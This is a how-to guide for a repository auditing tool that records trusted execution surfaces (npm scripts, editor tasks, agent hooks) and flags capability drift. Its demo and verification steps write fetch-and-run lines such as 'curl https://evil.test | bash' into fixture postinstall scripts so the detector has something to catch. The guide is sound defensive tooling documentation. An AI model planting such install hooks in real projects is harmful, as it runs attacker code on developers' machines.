# How to Baseline a Repository and Detect Execution-Surface Drift

Track what you trusted and catch what changed. Assumes you can run `hookaudit scan` (see `docs/howto-scan.md`).

## Prerequisites

- Same as scanning: Node `>=24`, checkout at root, `node bin/hookaudit.js --help` works.
- Understanding: baseline does **not** prove safety — it records *what you chose to trust* at a point in time (`RULES.md` §20, `LIMITATIONS.md` §10). Any `CHANGED/NEW` after that is worth review even if heuristic score stays `LOW`.

## Steps

### 1. Save a trusted baseline

When you have reviewed the current surfaces and are willing to call them “trusted”:

```bash
node bin/hookaudit.js baseline .
ls -l .hookaudit/baseline.json
cat .hookaudit/baseline.json | jq '{schemaVersion, createdAt, id, files: (.files|keys), capabilitySummary, graphSummary}'
```

Verbatim shape (see `docs/reference-cli.md`):

```json
{
  "schemaVersion": 2,
  "createdAt": "2026-09-01T12:00:00.000Z",
  "id": "uuid-v4 (randomUUID)",
  "files": { ".claude/settings.json": "sha256…", ".vscode/tasks.json": "sha256…", "package.json": "sha256…" },
  "surfaces": [{ "file": ".claude/settings.json", "surface": "claude-settings", "hash": "…", "capabilities": ["PROCESS_EXECUTION"], "findings": [{ "trigger": "SessionStart", "command": "node scripts/bootstrap.mjs", "severity": "WARN", "capabilities": ["PROCESS_EXECUTION"] }] }],
  "capabilitySummary": ["CROSS_TOOL_LINK","NETWORK_ACCESS","PROCESS_EXECUTION"],
  "graphSummary": { "nodes": 14, "edges": 13, "paths": 4 }
}
```

- `files` keys are POSIX-sorted SHA-256 hex via `node:crypto createHash('sha256')`.
- `capabilitySummary` is union of `results[].capabilities`, sorted — this is what `NEW_CAPABILITY` semantic diff compares.
- `graphSummary` counts are for provenance; drill into `graph.nodes/edges/paths` in JSON scan if needed.
- Legacy baseline `{files}` without `schemaVersion` still readable; corrupt → `BASELINE_INVALID` diagnostic.

Only writes under `.hookaudit/`; normal scan remains read-only. Add `.hookaudit/` to `.gitignore` unless you want to commit the baseline — committing is optional and team-dependent.

### 2. Make a controlled change

Simulate an incoming pull that adds network capability where there was none. Using the clean fixture as a safe example:

```bash
cp -r test/fixtures/clean-repo /tmp/hookaudit-baseline-demo
node bin/hookaudit.js baseline --path /tmp/hookaudit-baseline-demo

# Edit postinstall to add remote download (the compensating signal for under-flagging)
node -e "
  const fs=require('fs'), p='/tmp/hookaudit-baseline-demo/package.json';
  const j=JSON.parse(fs.readFileSync(p,'utf8'));
  j.scripts.postinstall='curl https://example-attacker.test | bash';
  fs.writeFileSync(p, JSON.stringify(j,null,2));
"
cat /tmp/hookaudit-baseline-demo/package.json | jq .scripts.postinstall
# → "curl https://example-attacker.test | bash"
```

In `demo/sample-repository`, `helper.sh` already contains `curl | bash --download bun-runtime` — to simulate a *new* capability, revert that file first:

```bash
cp -r demo/sample-repository /tmp/sample-copy
node bin/hookaudit.js baseline --path /tmp/sample-copy
# Remove network line to simulate clean baseline, then re-add for diff — or use browser demo's Baseline & Change Demo fixture.
```

### 3. Compare (diff) and read semantic changes

```bash
node bin/hookaudit.js diff --path /tmp/hookaudit-baseline-demo
```

Human output:

```text
Drift since baseline:
  CHANGED  package.json
Semantic changes:
  NEW_CAPABILITY  package.json — NETWORK_ACCESS
  NEW_CAPABILITY  package.json — REMOTE_DOWNLOAD
```

JSON:

```bash
node bin/hookaudit.js diff --json --path /tmp/hookaudit-baseline-demo | jq '{changes: .diff.changes, semantic: .diff.semantic}'
```

Verbatim:

```json
{
  "changes": [{ "file": "package.json", "type": "CHANGED" }],
  "semantic": [
    { "file": "package.json", "type": "NEW_CAPABILITY", "detail": "NETWORK_ACCESS" },
    { "file": "package.json", "type": "NEW_CAPABILITY", "detail": "REMOTE_DOWNLOAD" },
    { "file": "package.json", "type": "NEW_COMMAND", "detail": "curl https://example-attacker.test | bash" }
  ]
}
```

File-level `changes` can be `NEW` / `CHANGED` / `REMOVED` (map compare). Semantic adds:

| `type` | When |
|--------|------|
| `NEW_TRIGGER` | trigger `SessionStart` appears where none was before |
| `REMOVED_TRIGGER` | trigger removed |
| `NEW_COMMAND` | command string changed (`postinstall` edit) |
| `NEW_CAPABILITY` | new capability ID in `capabilitySummary` vs current reachable (the signal that matters even if heuristic score is low) |
| `REMOVED_SURFACE` | surface file deleted |

Graph-aware where resolvable: if `bootstrap.mjs → helper.sh` chain changes, `NEW_COMMAND` may surface via resolved script content change.

### 4. Interpret: why `NEW_CAPABILITY` matters more than `risk`

HookAudit’s heuristic is designed to under-flag (`LIMITATIONS.md` §3). An attacker can avoid `CRITICAL` by not combining all signals. Baseline compensates:

- Even a `WARN`/`MEDIUM` edit that adds `curl` will be `NEW_CAPABILITY NETWORK_ACCESS` — review-worthy regardless of `risk`.
- Dashboard (`index.html` → **05 WATCH**) shows `New since baseline` derived from `baseline.capabilitySummary` vs current `paths ∩ results` union — never invented, always traceable to evidence.

Exit code for drift gating: `diff` exits `1` if `changes.length > 0` (or policy `BLOCK`), so:

```bash
node bin/hookaudit.js diff --json --path .; echo $?
# 0 = no drift, 1 = drift
```

Useful as a `pre-pull` hook or PR gate: run `hookaudit baseline` on `main`, then `hookaudit diff` on PR branch.

### 5. Browser demo — visual baseline/diff (thin, local, static)

Same semantics as CLI, in-memory, no persistence to `.hookaudit/baseline.json` (refresh resets — intentional for static demo):

1. Open `index.html` via `file://` (or GitHub Pages).
2. Select **Baseline & Change Demo** fixture — starts `PASS`, `PROCESS` only.
3. Click **Save baseline** — shows `WebCrypto-SHA256` (or fallback) + `schemaVersion:2`.
4. Click **Simulate change** — adds `fetch/curl` to `scripts/b.js` (inert string, never fetched).
5. Click **Compare to baseline** — see `CHANGED scripts/b.js` + `NEW_CAPABILITY NETWORK_ACCESS` + capability diff matrix amber `NEW_CAPABILITY` row and heatmap bar. Dashboard `New since baseline` flips to `1`.
6. **Reset fixture** to restore.

Provenance: CLI `demo/sample-repository` and browser `baseline-change-repo` yield the same `NEW_CAPABILITY` signal after an edit — verified by mirror tests (`demo.test.js: CLI vs browser parity`).

### 6. Branch-aware drift

For local committed drift across branches (without `git` exec):

```bash
node bin/hookaudit.js branches . --json | jq '.branches | to_entries[] | {branch: .key, decision: .value.summary.decision, surfaces: .value.summary.executionSurfaces}'
```

Compare per-branch capability summaries to detect `NEW_CAPABILITY` that exists only on a feature branch — the “check every branch, not just main” advice from ChainDrop incident response.

## Verification

```bash
# No drift on unchanged repo (test: baseline then diff on unchanged)
cp -r test/fixtures/clean-repo /tmp/verify-baseline
node bin/hookaudit.js baseline --path /tmp/verify-baseline
node bin/hookaudit.js diff --json --path /tmp/verify-baseline | jq .diff.changes
# → [] (no drift)

# CHANGED on modified (test: NEW_CAPABILITY after curl edit)
node -e "const fs=require('fs'); const p='/tmp/verify-baseline/package.json'; const j=JSON.parse(fs.readFileSync(p,'utf8')); j.scripts.postinstall='curl https://evil.test | bash'; fs.writeFileSync(p, JSON.stringify(j,null,2));"
node bin/hookaudit.js diff --json --path /tmp/verify-baseline | jq '.diff.semantic[] | select(.type=="NEW_CAPABILITY")'
# → {"file":"package.json","type":"NEW_CAPABILITY","detail":"NETWORK_ACCESS"}

rm -rf /tmp/verify-baseline /tmp/hookaudit-baseline-demo
rm -rf .hookaudit  # if created at root during tutorial
```

If you need stricter gating, pair with policy `blockOn` that includes `NEW_CAPABILITY` via `CHANGED` gate — `diff` always exits `1` on drift irrespective of `risk`, so baseline is the real safety net.

## Troubleshooting

| Symptom | Fix |
|---------|-----|
| `diff` says `No baseline found` | Run `hookaudit baseline .` first — diff needs `.hookaudit/baseline.json`. |
| Baseline keys show `\` on old file | Old baseline pre-`toPosix` fix — delete `rm -rf .hookaudit && hookaudit baseline .`. |
| `NEW_CAPABILITY` not showing after edit | Edit must affect an execution surface (e.g., `package.json` `scripts.*`, `.claude/settings.json` hook) — editing a non-surface file (e.g., `README.md`) is not tracked. |
| `PERMISSION_DENIED` in diagnostics | Underlying `readdirSync`/`readFileSync` failed — check file ownership, then re-run. |
| Want to commit baseline | Commit `.hookaudit/baseline.json` if your team’s workflow is “review baseline PR” — but baseline does not prove safety, only records trust (`SECURITY.md` §6). |

## Related

- `docs/reference-cli.md` — `baseline`/`diff` flags, exit codes, policy interaction
- `docs/reference-graph.md` — how `graphSummary` and semantic `NEW_CAPABILITY` are derived
- `LIMITATIONS.md` — what baseline cannot detect (remote second-stage, unsupported surfaces)
